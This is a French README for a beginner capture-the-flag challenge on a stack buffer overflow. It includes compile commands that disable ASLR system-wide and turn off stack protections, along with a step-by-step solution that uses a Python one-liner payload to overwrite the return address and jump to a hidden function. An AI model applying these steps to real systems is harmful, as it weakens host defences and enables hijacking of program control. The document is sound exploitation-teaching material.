# Buffer Overflow

## Description

Bienvenue dans ce CTF dédié à l'exploitation d'une vulnérabilité de type **buffer overflow** ! L'objectif de ce challenge est de comprendre comment un dépassement de tampon peut permettre à un attaquant de prendre le contrôle du flux d'exécution d'un programme pour accéder à une fonction secrète.

## Objectif

Votre mission est d'exploiter une vulnérabilité dans le programme pour déclencher la fonction cachée `tiktok()` et obtenir le flag.

## Fichiers fournis

- `main.c` : Le code source du programme vulnérable.
- `main` : Le binaire compilé du programme.
- `README.md` : Ce fichier.

## Instructions

1. **Compiler le programme (si nécessaire)** :
    Si vous souhaitez recompiler le programme, utilisez la commande suivante :

    ```bash
    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    gcc -o main main.c -fno-stack-protector -z execstack -no-pie
    ```

    Les options utilisées :
    - `-fno-stack-protector` : Désactive la protection de la pile.
    - `-z execstack` : Rend la pile exécutable (utile pour des exploits plus avancés).
    - `-no-pie` : Désactive la randomisation des adresses (ASLR), rendant l'exploitation plus simple.

2. **Analyser la vulnérabilité** :
    Le programme contient une fonction vulnérable à un buffer overflow qui peut être exploitée pour rediriger l'exécution vers une fonction secrète.

3. **Lancer le programme** :
    exemple:
    ```bash
    ./main
    ```
    ou:
    ```bash
    python3 -c 'print("A" * 24)' | ./main
    ```

4. **Obtenir le flag** :
    Si votre exploit réussit, vous verrez apparaître le flag.

## Conseils

- Le programme utilise un petit buffer (`char buffer[16]`), ce qui rend l'overflow facile à atteindre.
- L'adresse de la fonction `tiktok()` est fournie directement pour simplifier le challenge.
- Assurez-vous de bien respecter l'ordre Little Endian lors de la construction du payload.

## Solution

Pour ceux qui ont besoin d’un coup de pouce, voici les étapes pour exploiter la vulnérabilité :

1. Identifiez la taille du buffer et l'offset nécessaire pour atteindre l'adresse de retour:
  ```bash
  python3 -c 'print("A" * 24)' | ./main
  ```
  augmenter la taille pour trouver quel est le nombre qui provoquera un segmentation fault
2. Trouver l'adresse de la fonction `tiktok()` avec gdb:
```bash
 gdb ./main
 info functions tiktok
```
3. créer le payload avec le nombre qui a permis de faire un segmentation fault + l'adresse en little endian(en gros on inverse on lit de droite a gauche):
```bash
# si votre adresse c'est 0x0000000000401146 et que l'offset = 24
python3 -c 'print("A" * 24 + "\x46\x11\x40\x00\x00\x00\x00\x00")' | ./main
```
4. Exécutez le payload pour obtenir le flzag.